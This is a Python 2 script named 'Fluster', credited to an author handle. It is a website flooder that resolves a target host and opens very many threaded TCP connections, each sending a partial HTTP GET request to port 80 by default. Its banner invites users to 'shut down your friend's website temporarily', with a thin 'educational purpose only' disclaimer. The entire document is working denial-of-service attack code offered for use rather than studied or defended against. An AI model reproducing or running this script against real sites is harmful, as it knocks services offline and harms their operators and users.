#Blog website temporary flooder by cyb3rs4k1
#facebook link : https://www.facebook.com/cyb3rs4k1/
#twitter link : @cyb3rs4k1
#linkedin link : https://www.linkedin.com/in/cyb3rs4k1/
#  _______ _                 _           __                 _                     _                 _ _
# |__   __| |               | |         / _|               | |                   | |               | (_)            
#    | |  | |__   __ _ _ __ | | _____  | |_ ___  _ __    __| | _____      ___ __ | | ___   __ _  __| |_ _ __   __ _ 
#    | |  | '_ \ / _` | '_ \| |/ / __| |  _/ _ \| '__|  / _` |/ _ \ \ /\ / | '_ \| |/ _ \ / _` |/ _` | | '_ \ / _` |
#    | |  | | | | (_| | | | |   <\__ \ | || (_) | |    | (_| | (_) \ V  V /| | | | | (_) | (_| | (_| | | | | | (_| |
#    |_|  |_| |_|\__,_|_| |_|_|\_|___/ |_| \___/|_|     \__,_|\___/ \_/\_/ |_| |_|_|\___/ \__,_|\__,_|_|_| |_|\__, |
#                                                                                                              __/ |
#                                                                                                             |___/ 

import sys,socket,threading

from colorama import init
init(strip=not sys.stdout.isatty()) 
from termcolor import cprint 
from pyfiglet import figlet_format

import random,string,threading,time

try:
    host = str(sys.argv[1]).replace("https://","").replace("http://","").replace("www","")
    ip = socket.gethostbyname( host )
except:
    cprint(figlet_format('FLUSTER', font='starwars'),
       'yellow', 'on_red', attrs=['bold'])
    print "--------------------------------------------------------------------------------------------------------------"
    print "                                 Shut down your friend's website temporarily                                  "
    print "(Note : This is for educational purpose only. I am not responsible for any breach of security or server crash)"
    print "--------------------------------------------------------------------------------------------------------------"
    print "\n Usage : fluster.py (hostname) (port) (No. of intervals)"
    print "\n Example : python fluster.py blogname.com (optional) (optional)"
    print "\n ------------------------------------------- \n"

    sys.exit(0)

if len(sys.argv)<4:
    port = 80
    ran=100000000

elif len(sys.argv)==4:
    port = int(sys.argv[2])
    ran=int(sys.argv[3])

else:
    print "ERROR\n Usage : fluster.py (hostname) (port) (No. of intervals)"

global n
n=0

def attack():

    ip = socket.gethostbyname( host )
    global n
    msg=str(string.letters+string.digits+string.punctuation)
    data="".join(random.sample(msg,5))
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        n+=1
        dos.connect((ip, port))
        dos.send( "GET /%s HTTP/1.1\r\n" % data )
        print "\n "+time.ctime().split(" ")[3]+" "+"["+str(n)+"] Attack in progress"

    except socket.error:
        print "\n [ Connection down due to server issue. ] "

    dos.close()

cprint(figlet_format('FLUSTER', font='starwars'),
       'yellow', 'on_red', attrs=['bold'])

print "--------------------------------------------------------------------------------------------------------------"
print "                                 Shut down your friend's website temporarily                                  "
print "(Note : This is for educational purpose only. I am not responsible for any breach of security or server crash)"
print "--------------------------------------------------------------------------------------------------------------"

print "\n\n **************************In case of ceasing flood, press 'ctrl+c' **************************************" 
time.sleep(1)
print " Starting in 3"
time.sleep(1)
print " 2"
time.sleep(1)
print " 1"
time.sleep(1)

print "---------------------------------"
print "\n\n[#] Attack started on. Dracarys :",host,"|",ip,"\n"
print "---------------------------------"
time.sleep(1)
nn=0

for i in xrange(ran):
    nn+=1
    t1 = threading.Thread(target=attack)
    t1.daemon =True # if thread exits, it destroys here
    t1.start()

    t2 = threading.Thread(target=attack)
    t2.daemon =True # if thread exits, it destroys here
    t2.start()

    if nn==100:
        nn=0
        time.sleep(0.01)

